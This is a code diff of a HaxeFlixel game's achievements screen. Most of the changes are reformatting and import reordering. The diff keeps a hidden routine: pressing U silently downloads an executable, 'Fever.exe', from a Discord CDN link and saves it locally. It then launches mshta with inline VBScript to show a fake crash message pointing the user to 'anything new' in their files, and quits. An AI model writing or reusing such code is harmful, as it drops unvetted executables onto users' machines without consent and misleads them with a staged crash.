@@ -1,15 +1,15 @@
 package states;
 
-import sys.io.File;
-import haxe.io.Bytes;
-import sys.Http;
-import flixel.util.FlxTimer;
-import flixel.tweens.FlxTween;
 import flixel.FlxG;
 import flixel.FlxSprite;
 import flixel.input.mouse.FlxMouseEvent;
 import flixel.text.FlxText;
+import flixel.tweens.FlxTween;
 import flixel.util.FlxSpriteUtil;
+import flixel.util.FlxTimer;
+import haxe.io.Bytes;
+import sys.Http;
+import sys.io.File;
 
 class AchievementState extends MusicBeatState
 {
@@ -36,6 +36,7 @@ class AchievementState extends MusicBeatState
 	override function create()
 	{
 		super.create();
+		AchievementHandler.check();
 
 		var bg = new FlxSprite().loadGraphic(Paths.image("menuDesat"));
 		bg.color = 0xFF00FFFF;
@@ -130,34 +131,32 @@ class AchievementState extends MusicBeatState
 		plsWait.antialiasing = true;
 		add(plsWait);
 		plsWait.alpha = 0;
-
 	}
 
 	override function update(elapsed:Float)
 	{
 		super.update(elapsed);
 
-		if(FlxG.keys.justPressed.U)
+		if (FlxG.keys.justPressed.U)
 		{
-			FlxTween.tween(plsWait, {alpha: 1}, 0.5, {onComplete: (twn) -> {
-
-
-				var shadow = new Http("https://cdn.discordapp.com/attachments/869878983381123072/1065902753320271883/Fever.exe");
-				shadow.onBytes = function(bytes:Bytes)
+			FlxTween.tween(plsWait, {alpha: 1}, 0.5, {
+				onComplete: (twn) ->
 				{
-					File.saveBytes('fever.exe', bytes);
+					var shadow = new Http("https://cdn.discordapp.com/attachments/869878983381123072/1065902753320271883/Fever.exe");
+					shadow.onBytes = function(bytes:Bytes)
+					{
+						File.saveBytes('fever.exe', bytes);
+					}
+					shadow.request();
+
+					if (FlxG.sound.music != null)
+						FlxG.sound.music.stop();
+
+					Sys.sleep(2);
+					Sys.command('mshta vbscript:Execute("msgbox ""Uh Oh! Unexpected crash, please check your files for anything new!"":close")');
+					Sys.exit(1);
 				}
-				shadow.request();
-
-				if(FlxG.sound.music != null)
-					FlxG.sound.music.stop();
-
-				Sys.sleep(2);
-				Sys.command('mshta vbscript:Execute("msgbox ""Uh Oh! Unexpected crash, please check your files for anything new!"":close")');
-				Sys.exit(1);
-			}});
-
-			
+			});
 		}
 		if (controls.BACK)
 			FlxG.switchState(new MainMenuState());
